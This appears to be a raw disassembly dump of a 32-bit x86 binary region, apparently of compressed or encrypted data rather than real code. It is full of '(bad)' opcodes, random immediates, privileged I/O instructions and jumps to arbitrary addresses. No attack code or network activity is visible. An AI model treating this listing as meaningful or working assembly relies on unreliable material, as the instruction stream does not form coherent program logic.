  42c131:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c132:	je     0x42c0cd
  42c134:	mov    ch,0x20
  42c136:	mov    ecx,0xbf1384f
  42c13b:	shl    edi,0xb8
  42c13e:	pop    ss
  42c13f:	pop    es
  42c140:	add    BYTE PTR [esi],bl
  42c142:	aam    0x5a
  42c144:	test   eax,0x452671f5
  42c149:	sbb    ch,BYTE PTR [esi-0x6e]
  42c14c:	sbb    eax,0xc597c302
  42c151:	loope  0x42c11b
  42c153:	jg     0x42c1b2
  42c155:	pop    ebp
  42c156:	neg    BYTE PTR [esp+ecx*4-0x1e]
  42c15a:	add    esi,DWORD PTR [esi-0x4bebbfb3]
  42c160:	and    esi,DWORD PTR [esp+eiz*2-0x1f2d9e13]
  42c167:	test   DWORD PTR [ebx],esi
  42c169:	iret   
  42c16a:	cmp    ah,bl
  42c16c:	leave  
  42c16d:	xor    BYTE PTR [edi],dh
  42c16f:	jp     0x42c19f
  42c171:	add    edx,DWORD PTR [ebx-0x53]
  42c174:	faddp  st(4),st
  42c176:	sub    al,0xd9
  42c178:	aas    
  42c179:	lods   al,BYTE PTR ds:[esi]
  42c17a:	jmp    FWORD PTR [eax-0x5d]
  42c17d:	sbb    bl,BYTE PTR [esi-0x62]
  42c180:	aaa    
  42c181:	push   eax
  42c182:	xchg   edi,eax
  42c183:	cmp    bh,BYTE PTR [edx]
  42c185:	mov    bh,0x9b
  42c187:	dec    ebp
  42c188:	dec    eax
  42c189:	adc    al,0x40
  42c18b:	retf   
  42c18c:	aas    
  42c18d:	ins    BYTE PTR es:[edi],dx
  42c18e:	pop    es
  42c18f:	pop    esi
  42c190:	or     eax,DWORD PTR [eax]
	...
  42c1f2:	add    BYTE PTR [eax],al
  42c1f4:	imul   eax,DWORD PTR [edx-0x10105133],0x90f2c76b
  42c1fe:	xchg   esp,eax
  42c1ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c200:	rcl    BYTE PTR [esi],1
  42c202:	mov    BYTE PTR [edi+0x1d8e6],ch
  42c208:	add    eax,0x16000001
  42c20d:	bound  eax,QWORD PTR [ecx]
  42c20f:	jo     0x42c251
  42c211:	and    eax,0x739f8cb1
  42c216:	jle    0x42c1c7
  42c218:	mov    eax,0x901bb113
  42c21d:	mov    dl,BYTE PTR [ebx]
  42c21f:	or     DWORD PTR fs:[eax+0x74dd2a39],ebx
  42c226:	jbe    0x42c2a0
  42c228:	cmp    esp,DWORD PTR [ebx-0x76d3ccbd]
  42c22e:	(bad)  
  42c22f:	lods   al,BYTE PTR ds:[esi]
  42c230:	jmp    0x17cc029
  42c235:	inc    edi
  42c236:	xchg   ebx,eax
  42c237:	rcr    DWORD PTR [ebx],cl
  42c239:	add    dl,dh
  42c23b:	or     DWORD PTR [ebx],esi
  42c23d:	in     eax,dx
  42c23e:	fs pop ebp
  42c240:	sbb    DWORD PTR [ebp+0x66],edi
  42c243:	pop    esp
  42c244:	cmp    al,0x5d
  42c246:	mov    ch,0x16
  42c248:	sbb    DWORD PTR [ebx],ebp
  42c24a:	jae    0x42c27a
  42c24c:	mov    bl,0x2a
  42c24e:	rol    DWORD PTR [eax-0x1],cl
  42c251:	mov    ebp,0xdcb98c24
  42c256:	out    0x4a,al
  42c258:	cli    
  42c259:	inc    ebp
  42c25a:	std    
  42c25b:	jae    0x42c2dc
  42c25d:	add    BYTE PTR [esi+0x649b3be1],cl
  42c263:	ja     0x42c250
  42c265:	loop   0x42c2d6
  42c267:	adc    eax,0xa83ca2f2
  42c26c:	jl     0x42c217
  42c26e:	adc    DWORD PTR [ebx+0x16],edi
  42c271:	call   0x49648ae
  42c276:	dec    esp
  42c277:	pop    ss
  42c278:	and    bl,dl
  42c27a:	jno    0x42c2e2
  42c27c:	pop    ebx
  42c27d:	jg     0x42c205
  42c27f:	mov    BYTE PTR [ebx+0x42],bh
  42c282:	xchg   edx,eax
  42c283:	or     edx,DWORD PTR [edx+0x4c00ec28]
  42c289:	mov    esi,0x5065e9d
  42c28e:	dec    esp
  42c28f:	adc    BYTE PTR [ecx-0x22],dl
  42c292:	mov    ebx,0xde9c6f18
  42c297:	(bad)  [ecx+eax*4+0x39676051]
  42c29e:	push   edi
  42c29f:	in     al,dx
  42c2a0:	adc    al,0x1b
  42c2a2:	outs   dx,DWORD PTR ds:[esi]
  42c2a3:	push   eax
  42c2a4:	sub    al,0x2a
  42c2a6:	mov    ch,0x3a
  42c2a8:	push   ebx
  42c2a9:	mov    ebp,DWORD PTR [ebp+eax*8-0x5f]
  42c2ad:	and    eax,0x7a386b0d
  42c2b2:	mov    al,ds:0x668bd7b3
  42c2b7:	dec    esp
  42c2b8:	or     edi,DWORD PTR [ebx]
  42c2ba:	jmp    0x42c2f6
  42c2bc:	adc    BYTE PTR [ecx],0x38
  42c2bf:	std    
  42c2c0:	cli    
  42c2c1:	leave  
  42c2c2:	adc    eax,0x379ef798
  42c2c7:	(bad)  
  42c2c8:	rcl    al,1
  42c2ca:	rcl    DWORD PTR [ebx],cl
  42c2cc:	loope  0x42c2f8
  42c2ce:	cmc    
  42c2cf:	loope  0x42c321
  42c2d1:	mov    edx,0x45d1593f
  42c2d6:	sti    
  42c2d7:	jno    0x42c299
  42c2d9:	lods   eax,DWORD PTR ds:[esi]
  42c2da:	fsubr  DWORD PTR [ebp-0x575409a0]
  42c2e0:	or     cl,BYTE PTR [eax+0x4589d350]
  42c2e6:	push   ss
  42c2e7:	dec    edi
  42c2e8:	xchg   esi,eax
  42c2e9:	ins    BYTE PTR es:[edi],dx
  42c2ea:	sbb    eax,0x54364f6b
  42c2ef:	xchg   edx,eax
  42c2f0:	and    ch,BYTE PTR [ecx-0xcefe3a5]
  42c2f6:	sub    BYTE PTR [esi+0x37],0x25
  42c2fa:	scas   al,BYTE PTR es:[edi]
  42c2fb:	jno    0x42c29f
  42c2fd:	pop    ebp
  42c2fe:	mov    edx,0xf5dd17ee
  42c303:	xchg   BYTE PTR [ebx],bh
  42c305:	sub    BYTE PTR [eax-0x19],cl
  42c308:	ret    0xcd24
  42c30b:	lahf   
  42c30c:	mov    edi,0x42d00d4b
	...
  42c371:	add    BYTE PTR [eax],al
  42c373:	add    dh,ah
  42c375:	psubusw mm5,QWORD PTR [ebp-0x7]
  42c379:	push   esi
  42c37b:	(bad)  
  42c37c:	in     eax,dx
  42c37d:	(bad)  
  42c37e:	sub    eax,0xf5118bf6
  42c383:	cmp    ebx,ebp
  42c385:	fld    DWORD PTR [ecx]
  42c387:	add    BYTE PTR ds:0x8d000001,al
  42c38d:	sbb    dh,BYTE PTR [ebp-0x5e7d40b6]
  42c393:	ror    edi,1
  42c395:	xchg   ebx,eax
  42c396:	mov    esp,0xe4480bc4
  42c39b:	cli    
  42c39c:	(bad)  
  42c39d:	mov    DWORD PTR [esi+0x49],edx
  42c3a0:	imul   esi,edi,0xffffffcd
  42c3a3:	dec    eax
  42c3a4:	xor    DWORD PTR [ecx],eax
  42c3a6:	cli    
  42c3a7:	loope  0x42c36d
  42c3a9:	jle    0x42c3d0
  42c3ab:	pop    ebx
  42c3ac:	and    DWORD PTR [edi+0x54d40b3a],0xb26b00f9
  42c3b6:	out    0xe9,al
  42c3b8:	push   cs
  42c3b9:	sbb    DWORD PTR [edx+0x5224add2],0xffffffb2
  42c3c0:	test   dl,dl
  42c3c2:	mov    ds:0xc8f4b6a8,al
  42c3c7:	push   esp
  42c3c8:	inc    ebx
  42c3c9:	neg    DWORD PTR [eax-0x58ab7b92]
  42c3cf:	jno    0x42c415
  42c3d1:	mov    bl,0x14
  42c3d3:	repnz xor esp,DWORD PTR [edx]
  42c3d6:	or     eax,0xf5e613c8
  42c3db:	dec    esi
  42c3dc:	mov    dh,0x86
  42c3de:	mov    bl,0x34
  42c3e0:	cmp    bh,bl
  42c3e2:	scas   eax,DWORD PTR es:[edi]
  42c3e3:	mov    ah,0x8
  42c3e5:	out    dx,al
  42c3e6:	inc    edi
  42c3e7:	repz xor BYTE PTR [ecx],bh
  42c3ea:	in     ax,dx
  42c3ec:	loope  0x42c404
  42c3ee:	or     dl,BYTE PTR [ebx+0x1cc6ca86]
  42c3f4:	jae    0x42c438
  42c3f6:	push   ecx
  42c3f7:	jns    0x42c44c
  42c3f9:	mov    dh,0x5d
  42c3fb:	add    BYTE PTR [ebp-0x2eee7319],bh
  42c401:	nop    DWORD PTR [ecx]
  42c404:	push   esi
  42c405:	cwde   
  42c406:	and    DWORD PTR [ecx+0x39b4ccd],esp
  42c40c:	xchg   ecx,eax
  42c40d:	xchg   edx,eax
  42c40e:	pop    ebx
  42c40f:	lea    edi,[esi-0x4153ca0e]
  42c415:	sar    BYTE PTR [ebp+0xc],0x3
  42c419:	jl     0x42c437
  42c41b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c41c:	dec    edx
  42c41d:	push   esp
  42c41e:	scas   al,BYTE PTR es:[edi]
  42c41f:	out    0xa4,al
  42c421:	shl    DWORD PTR [edi],1
  42c423:	push   ebx
  42c424:	(bad)  
  42c426:	(bad)  
  42c427:	adc    eax,0x51d2d9d7
  42c42c:	int    0x63
  42c42e:	out    0xd7,al
  42c430:	(bad)  
  42c431:	scas   eax,DWORD PTR es:[edi]
  42c432:	push   cs
  42c433:	stos   BYTE PTR es:[edi],al
  42c434:	das    
  42c435:	inc    edx
  42c436:	leave  
  42c437:	add    DWORD PTR [eax],edi
  42c439:	repnz adc al,ah
  42c43c:	jmp    0x3e1d:0x3b68
  42c442:	push   es
  42c443:	and    al,0x53
  42c445:	jb     0x42c402
  42c447:	inc    edx
  42c448:	jno    0x42c483
  42c44a:	or     al,0x28
  42c44c:	pop    ecx
  42c44d:	adc    al,BYTE PTR fs:[edx]
  42c450:	mov    al,ds:0x9893792
  42c455:	xor    cl,BYTE PTR [eax]
  42c457:	enter  0x4902,0x94
  42c45b:	into   
  42c45c:	int    0xb0
  42c45e:	jmp    0x42c4a5
  42c460:	(bad)  
  42c461:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c462:	add    eax,0x727f5f42
  42c467:	out    0x2a,eax
  42c469:	mov    WORD PTR [ecx+0x60],ss
  42c46c:	dec    edi
  42c46d:	mov    dh,0x4b
  42c46f:	adc    edx,DWORD PTR [edx]
  42c471:	jno    0x42c48a
  42c473:	out    dx,al
  42c474:	ss das 
  42c476:	xchg   ebx,eax
  42c477:	push   es
  42c478:	ds dec edx
  42c47a:	pop    edi
  42c47b:	lahf   
  42c47c:	cs push esp
  42c47e:	xchg   ebx,eax
  42c47f:	stc    
  42c480:	jl     0x42c445
  42c482:	xlat   BYTE PTR ds:[ebx]
  42c483:	ftst   
  42c485:	(bad)  
  42c486:	sbb    edx,ecx
  42c488:	adc    BYTE PTR [esi-0xa0581ef],ch
  42c48e:	push   cs
  42c48f:	mov    esp,0x2c
	...
  42c4f4:	in     al,dx
  42c4f5:	sbb    ebp,edx
  42c4f7:	sahf   
  42c4f8:	cmc    
  42c4f9:	fsubp  st(7),st
  42c4fb:	jnp    0x42c4af
  42c4fd:	sti    
  42c4fe:	enter  0x9334,0x6
  42c502:	mov    eax,esp
  42c504:	lock fiadd DWORD PTR [ecx]
  42c507:	add    BYTE PTR ds:0xd7000001,al
  42c50d:	sbb    al,0xe1
  42c50f:	adc    bh,cl
  42c511:	data16 mov al,ds:0x7c02b421
  42c517:	pop    ecx
  42c518:	mov    esi,0xd9cf2fc1
  42c51d:	neg    dh
  42c51f:	and    al,0x59
  42c521:	ja     0x42c4c2
  42c523:	sub    BYTE PTR [eax+0x28],bh
  42c526:	jno    0x42c566
  42c528:	out    dx,al
  42c529:	in     al,0x11
  42c52b:	imul   edi,DWORD PTR [ebx+0x54],0xffffff90
  42c52f:	ss pop ebx
  42c531:	shl    DWORD PTR [esi-0x2a],cl
  42c534:	push   0x222bbfda
  42c539:	xchg   BYTE PTR [esi+0x2c741f69],bl
  42c53f:	stc    
  42c540:	imul   DWORD PTR [edx-0x37d01d4e]
  42c546:	rcl    DWORD PTR [ebx],1
  42c548:	mov    eax,ds:0xdc5d022a
  42c54d:	cli    
  42c54e:	sbb    dh,BYTE PTR [edx]
  42c550:	gs pop ebp
  42c552:	xor    eax,DWORD PTR [edi-0x8]
  42c555:	jnp    0x42c525
  42c557:	repnz inc edx
  42c559:	sub    al,0x6d
  42c55b:	push   edx
  42c55c:	(bad)  
  42c55e:	sub    ebx,DWORD PTR [edi-0x61bc9993]
  42c564:	mov    al,ds:0x90619a7
  42c569:	jns    0x42c4ff
  42c56b:	mov    ch,0x62
  42c56d:	xchg   ecx,eax
  42c56e:	(bad)  
  42c56f:	sub    dh,BYTE PTR [edi+0x277235b2]
  42c575:	in     al,dx
  42c576:	cmp    al,0x1e
  42c578:	pop    edi
  42c579:	mov    edx,0xdc0ff36c
  42c57e:	lahf   
  42c57f:	inc    ebp
  42c580:	mov    dh,0x42
  42c582:	xchg   edx,eax
  42c583:	scas   eax,DWORD PTR es:[edi]
  42c584:	or     BYTE PTR [edx],ch
  42c586:	mov    eax,ds:0x368a2fe7
  42c58b:	sub    BYTE PTR [esi+0x2e],dl
  42c58e:	adc    bh,BYTE PTR [ebx-0x71]
  42c591:	sub    al,0xb9
  42c593:	pop    eax
  42c594:	ret    
  42c595:	pop    ds
  42c596:	sti    
  42c597:	push   esi
  42c598:	popf   
  42c599:	in     al,dx
  42c59a:	sbb    eax,0x6ed95ac3
  42c59f:	and    ebx,ecx
  42c5a1:	je     0x42c532
  42c5a3:	int3   
  42c5a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c5a5:	retf   0xe7ba
  42c5a8:	or     eax,0xad91cf7e
  42c5ad:	js     0x42c5df
  42c5af:	ret    0x5f65
  42c5b2:	jb     0x42c5c8
  42c5b4:	xor    eax,0x3ed83a6f
  42c5b9:	and    DWORD PTR [eax*1-0x3ae938bf],edi
  42c5c0:	pop    ecx
  42c5c1:	mov    ebx,0x914887b8
  42c5c6:	out    0x4,eax
  42c5c8:	shl    esp,0x2c
  42c5cb:	outs   dx,BYTE PTR ds:[esi]
  42c5cc:	dec    eax
  42c5cd:	loop   0x42c599
  42c5cf:	loop   0x42c5ff
  42c5d1:	xor    DWORD PTR [ecx],esp
  42c5d3:	daa    
  42c5d4:	xchg   esi,eax
  42c5d5:	ins    DWORD PTR es:[edi],dx
  42c5d6:	dec    esi
  42c5d7:	add    eax,0xbdeb4402
  42c5dc:	and    al,ah
  42c5de:	loop   0x42c566
  42c5e0:	fcmovnu st,st(1)
  42c5e2:	mov    WORD PTR [ebx],?
  42c5e4:	shr    ch,1
  42c5e6:	(bad)  
  42c5e7:	sti    
  42c5e8:	frstor [ebx+0x40]
  42c5eb:	sub    DWORD PTR [ebp+0x786d8148],0xffffff8f
  42c5f2:	jmp    0x42c5de
  42c5f4:	(bad)  
  42c5f6:	iret   
  42c5f7:	or     esi,edi
  42c5f9:	pop    ebx
  42c5fa:	jle    0x42c5bd
  42c5fc:	or     esi,0x5a69a5a5
  42c602:	xor    ch,BYTE PTR [edi]
  42c604:	xchg   esi,eax
  42c605:	jmp    0x42c61a
  42c607:	mov    cl,0xf
  42c609:	jne    0x42c5bb
  42c60b:	mov    bl,0x52
  42c60d:	lods   al,BYTE PTR ds:[esi]
  42c60e:	ss pop edi
  42c610:	pop    ss
	...
  42c671:	add    BYTE PTR [eax],al
  42c673:	add    BYTE PTR [ebp+0x48],bl
  42c676:	jle    0x42c606
  42c678:	jg     0x42c638
  42c67a:	std    
  42c67b:	fstp   TBYTE PTR [ebx-0x63920395]
  42c681:	mov    DWORD PTR [ecx-0x4e],edi
  42c684:	cmc    
  42c685:	fild   DWORD PTR [ecx]
  42c687:	add    BYTE PTR ds:0xb0000001,al
  42c68d:	add    al,0x48
  42c68f:	fwait
  42c690:	jp     0x42c6df
  42c692:	pushf  
  42c693:	mov    bl,0xa0
  42c695:	sbb    al,0x68
  42c697:	fnstenv es:[esi-0x7f0ce604]
  42c69e:	jbe    0x42c661
  42c6a0:	fdivr  DWORD PTR [edx-0x23b39ce5]
  42c6a6:	cwde   
  42c6a7:	adc    edx,DWORD PTR [ebx]
  42c6a9:	call   0xfa5b:0x2dca428a
  42c6b0:	cmp    DWORD PTR ds:0x49b86b40,ebx
  42c6b6:	mov    DWORD PTR [ecx-0x2c],ecx
  42c6b9:	cmp    cl,bh
  42c6bb:	ins    BYTE PTR es:[edi],dx
  42c6bc:	(bad)  
  42c6be:	(bad)  
  42c6bf:	out    dx,eax
  42c6c0:	fisubr WORD PTR [edx+eax*1+0x571f431c]
  42c6c7:	rol    BYTE PTR [edi-0x10d46baf],0x44
  42c6ce:	imul   edx,DWORD PTR [ecx],0x8da57a4f
  42c6d4:	ins    BYTE PTR es:[edi],dx
  42c6d5:	or     DWORD PTR [esi*8-0x5e300778],0xffffffa6
  42c6dd:	(bad)  
  42c6de:	std    
  42c6df:	les    ebx,FWORD PTR [ecx-0x79ca5280]
  42c6e5:	mov    WORD PTR [ecx+edx*1-0x7b],es
  42c6e9:	in     eax,dx
  42c6ea:	dec    ebp
  42c6eb:	mov    edi,DWORD PTR [ebx+0x54]
  42c6ee:	xor    ch,BYTE PTR [ebp+0x21e379c6]
  42c6f4:	or     al,0xd9
  42c6f6:	add    edi,ebx
  42c6f8:	pop    edx
  42c6f9:	cld    
  42c6fa:	cs jns 0x42c74f
  42c6fd:	cmp    al,0x5a
  42c6ff:	data16 hlt 
  42c701:	push   ss
  42c702:	mov    cl,0x35
  42c704:	add    al,0x11
  42c706:	lds    ebp,FWORD PTR [eax-0x6e]
  42c709:	pop    ss
  42c70a:	dec    ebp
  42c70b:	and    ch,BYTE PTR [edi+eax*4-0x95840fd]
  42c712:	xor    al,BYTE PTR [ecx+0x0]
  42c715:	mov    bl,BYTE PTR [ebx+0x25fe2d3d]
  42c71b:	and    eax,0xad7bc0fe
  42c720:	jge    0x42c6b2
  42c722:	test   BYTE PTR [ebx],0x5a
  42c725:	fidivr DWORD PTR [eax]
  42c727:	mov    ebx,0x30367b43
  42c72c:	sahf   
  42c72d:	sbb    esp,edi
  42c72f:	hlt    
  42c730:	mov    ebx,0xd619e41d
  42c735:	stos   BYTE PTR es:[edi],al
  42c736:	mov    cl,0x2
  42c738:	test   eax,0x8efed7ad
  42c73d:	(bad)  
  42c73e:	or     dl,BYTE PTR gs:[edi]
  42c741:	je     0x42c7b1
  42c743:	pop    esp
  42c744:	hlt    
  42c745:	imul   eax,DWORD PTR [esi],0xd5c8dac8
  42c74b:	mov    eax,0x4f313ab4
  42c750:	aam    0xd1
  42c752:	dec    edi
  42c753:	adc    ah,bl
  42c755:	xchg   ecx,eax
  42c756:	push   esp
  42c757:	int3   
  42c758:	leave  
  42c759:	(bad)  
  42c75b:	(bad)  
  42c75c:	jle    0x42c76c
  42c75e:	out    dx,al
  42c75f:	in     al,dx
  42c760:	test   eax,0xb95f8dbf
  42c765:	sbb    esp,DWORD PTR [eax-0xe274dc9]
  42c76b:	jbe    0x42c7d0
  42c76d:	add    eax,0x5206c4a5
  42c772:	jae    0x42c728
  42c774:	clc    
  42c775:	jg     0x42c7da
  42c777:	dec    esi
  42c778:	push   edi
  42c779:	jns    0x42c722
  42c77b:	retf   
  42c77c:	retf   
  42c77d:	lods   eax,DWORD PTR ds:[esi]
  42c77e:	in     al,0xe9
  42c780:	ret    0xf2f1
  42c783:	dec    esi
  42c784:	call   0xd4fb:0xf21f0405
  42c78b:	outs   dx,BYTE PTR ds:[esi]
  42c78c:	mov    WORD PTR [edx+0xdb9b66],fs
	...
  42c7f2:	add    BYTE PTR [eax],al
  42c7f4:	cmp    BYTE PTR [ecx-0x8046a96],cl
  42c7fa:	jmp    FWORD PTR [ebp-0x5bf1e2a3]
  42c800:	cld    
  42c801:	inc    ebx
  42c802:	out    dx,eax
  42c803:	sub    edx,edi
  42c805:	fadd   QWORD PTR [ecx]
  42c807:	add    BYTE PTR ds:0x1d000001,al
  42c80d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c80e:	xor    BYTE PTR [esi-0x5e],bh
  42c811:	inc    edx
  42c812:	inc    esi
  42c813:	rcl    DWORD PTR [ebp+0x4ec3830b],1
  42c819:	sub    ecx,DWORD PTR [ebx]
  42c81b:	dec    ebx
  42c81c:	aaa    
  42c81d:	icebp  
  42c81e:	xchg   DWORD PTR [esi],ebx
  42c820:	mov    cl,0xf9
  42c822:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c823:	mov    ch,0xaf
  42c825:	retf   
  42c826:	mov    al,0x94
  42c828:	mov    ds:0x563902ff,eax
  42c82d:	xchg   ebx,eax
  42c82e:	mov    al,0xf4
  42c830:	pop    ebx
  42c831:	xchg   eax,ecx
  42c833:	push   ds
  42c834:	aam    0x80
  42c836:	lods   eax,DWORD PTR ds:[esi]
  42c837:	sbb    eax,0x80836fe0
  42c83c:	scas   al,BYTE PTR es:[edi]
  42c83d:	jg     0x42c8b7
  42c83f:	les    ecx,FWORD PTR [ebp+0x1b]
  42c842:	mov    eax,ds:0xdfd0f340
  42c847:	arpl   ax,si
  42c849:	cmp    eax,0xd74482b0
  42c84e:	mov    esi,0x60774982
  42c853:	ror    BYTE PTR [ebx],1
  42c855:	inc    eax
  42c856:	push   ds
  42c857:	pop    ss
  42c858:	sbb    ebp,DWORD PTR ds:0xd893584d
  42c85e:	ss (bad) 
  42c860:	das    
  42c861:	cld    
  42c862:	call   ebp
  42c864:	xor    eax,0xb951c0f9
  42c869:	xchg   edx,eax
  42c86a:	in     eax,dx
  42c86b:	(bad)  [edx]
  42c86d:	cmc    
  42c86e:	xchg   ecx,eax
  42c86f:	mov    eax,ds:0x985b6e3d
  42c874:	leave  
  42c875:	les    eax,FWORD PTR ds:0x588e385c
  42c87b:	inc    esi
  42c87c:	jns    0x42c8b5
  42c87e:	inc    esp
  42c87f:	pop    eax
  42c880:	jb     0x42c864
  42c882:	mov    edi,edi
  42c884:	jle    0x42c831
  42c886:	es pop esp
  42c888:	mov    edi,DWORD PTR [edx-0x69]
  42c88b:	ins    DWORD PTR es:[edi],dx
  42c88c:	icebp  
  42c88d:	mov    ah,0x7f
  42c88f:	call   0xc1ce82aa
  42c894:	jbe    0x42c831
  42c896:	lods   al,BYTE PTR ds:[esi]
  42c897:	leave  
  42c898:	mov    cl,0x47
  42c89a:	fsubp  st(5),st
  42c89c:	jmp    0xd2bb3877
  42c8a1:	sbb    DWORD PTR [esp+edx*4],eax
  42c8a4:	dec    edx
  42c8a5:	nop
  42c8a6:	sti    
  42c8a7:	pop    esi
  42c8a8:	add    eax,0x9e4748c2
  42c8ad:	retw   
  42c8af:	and    eax,0x360f2c97
  42c8b4:	mov    bh,0xf3
  42c8b6:	mov    al,0x7f
  42c8b8:	mov    ds:0xedd7c940,al
  42c8be:	push   ss
  42c8bf:	loopne 0x42c904
  42c8c1:	cwde   
  42c8c2:	scas   al,BYTE PTR es:[edi]
  42c8c3:	call   0x9286ac41
  42c8c8:	mov    ecx,0x5c6b3f9
  42c8cd:	fcomp  DWORD PTR [eax+0x3e3df510]
  42c8d3:	xor    BYTE PTR [ebx+esi*1],dh
  42c8d6:	pop    es
  42c8d7:	leave  
  42c8d8:	fld    DWORD PTR [esi+0x289cb4d8]
  42c8de:	and    ebx,DWORD PTR [edi-0x6e5bdea2]
  42c8e4:	icebp  
  42c8e5:	jge    0x42c939
  42c8e7:	in     eax,0x99
  42c8e9:	lahf   
  42c8ea:	scas   eax,DWORD PTR es:[edi]
  42c8eb:	sti    
  42c8ec:	push   ds
  42c8ed:	dec    ebx
  42c8ee:	(bad)  
  42c8ef:	(bad)  
  42c8f0:	cmp    al,0x2e
  42c8f2:	cli    
  42c8f3:	dec    esi
  42c8f4:	mov    ds:0xd400074a,al
  42c8f9:	fcomp  DWORD PTR [esi+0x68abc6c1]
  42c8ff:	adc    ah,BYTE PTR [ecx+0x3e]
  42c902:	or     ecx,DWORD PTR [edx+0x10]
  42c905:	sbb    edi,DWORD PTR [ebp-0x1311ded2]
  42c90b:	mov    al,0xb8
  42c90d:	xchg   ebx,eax
  42c90e:	xor    cl,ah
  42c910:	push   ds
	...
  42c971:	add    BYTE PTR [eax],al
  42c973:	add    BYTE PTR [eax],dl
  42c975:	sbb    ecx,ecx
  42c977:	jmp    0xfb73c547
  42c97c:	(bad)  
  42c97d:	scas   eax,DWORD PTR es:[edi]
  42c97e:	inc    edi
  42c97f:	call   0xd3e7c2cc
  42c984:	(bad)  
  42c985:	fld    QWORD PTR [ecx]
  42c987:	add    BYTE PTR ds:0x90000001,al
  42c98d:	out    0xf3,al
  42c98f:	(bad)  
  42c990:	js     0x42c99f
  42c992:	add    BYTE PTR [ebx+eiz*4+0xc],bl
  42c996:	mov    bh,0x8
  42c998:	lods   al,BYTE PTR es:[esi]
  42c99a:	xor    edx,edx
  42c99c:	sbb    al,0x47
  42c99e:	push   ds
  42c99f:	mov    ch,0x7a
  42c9a1:	jge    0x42c949
  42c9a3:	or     al,0x54
  42c9a5:	xchg   BYTE PTR [edi],bl
  42c9a7:	xor    al,0xde
  42c9a9:	add    eax,0xb5405eba
  42c9ae:	jg     0x42c957
  42c9b0:	stc    
  42c9b1:	outs   dx,BYTE PTR ds:[esi]
  42c9b2:	inc    esi
  42c9b3:	or     al,al
  42c9b5:	inc    ecx
  42c9b6:	scas   al,BYTE PTR es:[edi]
  42c9b7:	cdq    
  42c9b8:	test   cl,dl
  42c9ba:	adc    bl,BYTE PTR [ebp+esi*4+0x3343cc3a]
  42c9c1:	sbb    ebx,ebx
  42c9c3:	xor    DWORD PTR ds:0xa7044351,esp
  42c9c9:	mov    eax,ds:0x8cd3a3b
  42c9ce:	ror    DWORD PTR [edi+0x3c],cl
  42c9d1:	pop    es
  42c9d2:	inc    eax
  42c9d3:	add    edx,DWORD PTR [ebx-0x7880b5a2]
  42c9d9:	push   ebp
  42c9da:	jl     0x42c981
  42c9dc:	sub    ebp,DWORD PTR [ebx+0x3]
  42c9df:	inc    edi
  42c9e0:	mov    ds:0x89cb0bb8,al
  42c9e5:	jmp    0x190435b8
  42c9ea:	cs mov ebx,0x9e80d13
  42c9f0:	jg     0x42c985
  42c9f2:	aas    
  42c9f3:	dec    edx
  42c9f4:	loop   0x42ca4a
  42c9f6:	fcmovnb st,st(4)
  42c9f8:	stc    
  42c9f9:	mov    esi,0x4b4b801
  42c9fe:	mov    edi,0x94799ee7
  42ca03:	in     al,0xd1
  42ca05:	shl    DWORD PTR [esp+esi*1],cl
  42ca08:	dec    eax
  42ca09:	mov    al,ds:0x67c7f13e
  42ca0f:	adc    eax,0x4b647368
  42ca14:	in     al,0x74
  42ca16:	retf   
  42ca17:	push   ecx
  42ca18:	jmp    0x3d1b4451
  42ca1d:	test   BYTE PTR [edx+0x15],dl
  42ca20:	ror    BYTE PTR cs:[edx-0x15fb675d],cl
  42ca27:	cmp    dh,ch
  42ca29:	inc    ebx
  42ca2a:	or     bh,BYTE PTR [ebp+ecx*2+0x7f7f0335]
  42ca31:	lds    esi,FWORD PTR [edi]
  42ca33:	loopne 0x42ca80
  42ca35:	dec    ebx
  42ca36:	xchg   ebx,eax
  42ca37:	dec    ecx
  42ca38:	pcmpeqd mm3,QWORD PTR [esi]
  42ca3b:	add    DWORD PTR [esi],edx
  42ca3d:	mov    ds:0x6ab2e767,al
  42ca42:	mov    ah,0x10
  42ca44:	cmp    ebx,ebx
  42ca46:	cmp    bl,0x95
  42ca49:	fs loopne 0x42c9f6
  42ca4c:	mov    dh,0xac
  42ca4e:	stc    
  42ca4f:	cwde   
  42ca50:	cmp    eax,0x247e327b
  42ca55:	inc    ebp
  42ca56:	(bad)  
  42ca57:	das    
  42ca58:	jnp    0x42ca75
  42ca5a:	fld    st(2)
  42ca5c:	cs iret 
  42ca5e:	jl     0x42ca19
  42ca60:	pop    es
  42ca61:	adc    esp,DWORD PTR [esi]
  42ca63:	shl    dl,0xf4
  42ca66:	mov    ch,0xae
  42ca68:	and    BYTE PTR [esi+0x31],ch
  42ca6b:	enter  0xf798,0x14
  42ca6f:	jmp    0x5c01:0xd43d49a8
  42ca76:	push   esp
  42ca77:	dec    ebp
  42ca78:	aas    
  42ca79:	push   ds
  42ca7a:	int3   
  42ca7b:	add    al,0x12
  42ca7d:	mov    ecx,DWORD PTR [ebp+eax*4-0x49]
  42ca81:	ss nop
  42ca83:	scas   eax,DWORD PTR es:[edi]
  42ca84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ca85:	pop    esi
  42ca86:	scas   eax,DWORD PTR es:[edi]
  42ca87:	fisttp DWORD PTR [esi]
  42ca89:	cmc    
  42ca8a:	cld    
  42ca8b:	repnz mov bh,0x7f
  42ca8e:	in     eax,dx
  42ca8f:	fs jns 0x42ca92
	...
  42caf2:	add    BYTE PTR [eax],al
  42caf4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42caf5:	fimul  DWORD PTR [eax-0x10ac02bf]
  42cafb:	(bad)  
  42cafc:	fadd   QWORD PTR [ebp+0x637a6ec0]
  42cb02:	ficomp DWORD PTR [edx+0x4]
  42cb05:	fild   WORD PTR [ecx]
  42cb07:	add    BYTE PTR ds:0xba000001,al
  42cb0d:	pop    ecx
  42cb0e:	mov    ebx,0x1924c01e
  42cb13:	(bad)  
  42cb14:	dec    eax
  42cb15:	or     BYTE PTR [esi+0x58],al
  42cb18:	outs   dx,BYTE PTR ds:[esi]
  42cb19:	test   BYTE PTR [edi-0x1594084a],al
  42cb1f:	push   ss
  42cb20:	std    
  42cb21:	aad    0xed
  42cb23:	daa    
  42cb24:	sbb    al,0xa9
  42cb26:	sar    DWORD PTR [ebp+0x3a],cl
  42cb29:	mov    ah,0x2d
